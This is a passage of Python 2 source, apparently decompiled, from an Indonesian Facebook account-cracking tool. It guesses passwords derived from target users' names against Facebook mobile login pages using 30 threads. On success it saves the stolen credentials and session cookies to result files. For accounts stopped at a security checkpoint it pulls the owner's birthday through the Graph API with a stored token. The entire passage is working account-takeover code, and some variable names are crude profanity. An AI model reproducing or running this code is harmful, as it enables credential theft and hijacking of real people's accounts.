            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* >>> %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.au/.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* >>> %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass
                print '\r  %s* >>> %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mfb__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass
            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36'
            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* >>> %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.au/.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* >>> %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass
                print '\r  %s* >>> %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __pler__(self):
        yan = raw_input('\n [X>] method : ')
        if yan == '':
            print '\n %s[%s\xc3\x97%s] Fille Correctly bro' % (N, M, N)
            self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] Ok Results Saved To >>results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            time.sleep(0.2)
            print ' [%s+%s] CP Results Saved To >>results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            time.sleep(0.2)
            jalan('\n [%s!%s]  You can Turn off Cellular Data to Pause The Crack Process\n' % (M, N))
            time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok, cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] Ok Results Saved To >>results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            time.sleep(0.2)
            print ' [%s+%s] CP Results Saved To >>results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            time.sleep(0.2)
            jalan('\n [%s!%s]  You can Turn off Cellular Data to Pause The Crack Process\n' % (M, N))
            time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok, cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] Ok Results Saved To >>results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            time.sleep(0.2)
            print ' [%s+%s] CP Results Saved To >>results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            time.sleep(0.2)
            jalan('\n [%s!%s]  You can Turn off Cellular Data to Pause The Crack Process\n' % (M, N))
            time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok, cp)
        else:
            print '\n %s[%s\xc3\x97%s] input yang bener' % (N, M, N)
            self.__pler__()
if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
# Mau Ngapain Cuk?
